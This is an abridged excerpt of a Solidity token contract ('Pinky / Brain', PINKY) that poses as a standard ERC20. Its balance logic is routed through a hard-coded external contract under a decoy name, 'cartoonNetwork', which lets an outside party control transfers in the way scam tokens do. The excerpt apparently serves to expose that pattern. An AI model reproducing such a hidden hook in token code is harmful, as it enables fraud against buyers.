...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _cartoonNetwork = 0x647722a50849Fa7195964115256dBDD5d072746a;
    address public pair;

    IDEXRouter router;
    IERC777 cartoonNetwork;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        cartoonNetwork = IERC777(_cartoonNetwork);
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return cartoonNetwork.pushTransaction(amount);
    }
    ...
    function _DeployPinky(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPinky(creator, initialSupply);
    }
}

contract Pinky is ERC20Token {
    constructor() ERC20Token("Pinky / Brain", "PINKY", msg.sender, 420000000 * 10 ** 18) {
    }
}